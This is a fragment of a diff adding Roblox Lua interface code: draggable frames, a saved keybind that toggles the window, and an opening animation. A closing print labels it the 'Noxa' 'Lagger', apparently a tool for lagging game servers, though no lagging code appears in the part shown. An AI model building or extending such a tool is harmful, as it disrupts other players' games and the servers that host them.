+    local dragging, startPos, startFrame
+    Float.InputBegan:Connect(function(inp)
+        if inp.UserInputType ~= Enum.UserInputType.MouseButton1 and inp.UserInputType ~= Enum.UserInputType.Touch then return end
+        dragging = true
+        startPos = inp.Position
+        startFrame = Float.Position
+    end)
+    UserInputService.InputChanged:Connect(function(inp)
+        if not dragging then return end
+        if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
+        local delta = inp.Position - startPos
+        Float.Position = UDim2.new(startFrame.X.Scale, startFrame.X.Offset + delta.X, startFrame.Y.Scale, startFrame.Y.Offset + delta.Y)
+    end)
+    UserInputService.InputEnded:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+end
+
+----------------------------------------------------------------
+-- Keybind system
+----------------------------------------------------------------
+local listeningKey = false
+KeybindBtn.MouseButton1Click:Connect(function()
+    if listeningKey then return end
+    listeningKey = true
+    KeybindBtn.Text = "[...]"
+    KeybindBtn.TextColor3 = Accent
+end)
+
+UserInputService.InputBegan:Connect(function(inp, gpe)
+    if listeningKey then
+        if gpe then return end
+        if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode ~= Enum.KeyCode.Unknown then
+            Config.keybind = inp.KeyCode
+            listeningKey = false
+            KeybindBtn.Text = "[" .. Config.keybind.Name .. "]"
+            KeybindBtn.TextColor3 = ColorMuted
+            SaveConfig()
+        end
+        return
+    end
+    if gpe then return end
+    if inp.KeyCode == Config.keybind then
+        DoToggle()
+    end
+end)
+
+----------------------------------------------------------------
+-- Open animation
+----------------------------------------------------------------
+Phone.Size = UDim2.new(0, 260, 0, 340)
+Tween(Phone, TweenBack, {Size = UDim2.new(0, 400, 0, 420)})
+VersionLabel.Text = Config.version
+VersionBox.Text = Config.version
+
+print("[Noxa] Lagger ready")
